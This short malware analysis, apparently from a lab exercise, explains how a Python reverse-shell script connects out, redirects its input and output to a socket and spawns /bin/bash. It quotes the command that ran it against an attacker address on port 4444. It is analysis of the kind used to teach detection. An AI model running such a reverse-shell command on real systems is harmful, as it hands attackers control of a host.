This malware sample is a `Python` script that is used to spawn a shell on a remote system. 
The script uses the `socket`, `os`, `argparse`, and `pty` modules.
* The `socket` module is used to create a socket object that is used to connect to the remote system.
* The `os` module is used to duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
* The `argparse` module is used to parse the command line arguments.
* The `pty` module is used to spawn a shell on the remote system.

The script performs the following steps:
1. Initialize the parser object and parse the command line arguments.
2. Create a socket object using the specified socket family, type, protocol, and file descriptor.
3. Connect to the remote system using the specified IP address and port.
4. Duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
5. Spawn a shell on the remote system.

Since the script was executed with the following command: `python3 example.py -l 100.100.101.101 -p 4444 &` we know the script was run in the background and attempted to connect to the attacker system with IP address `100.100.101.101` on port `4444`.
We also know that the script attempted to spawn a `/bin/bash` shell on the remote system since this is the default value for the `--shell` argument.
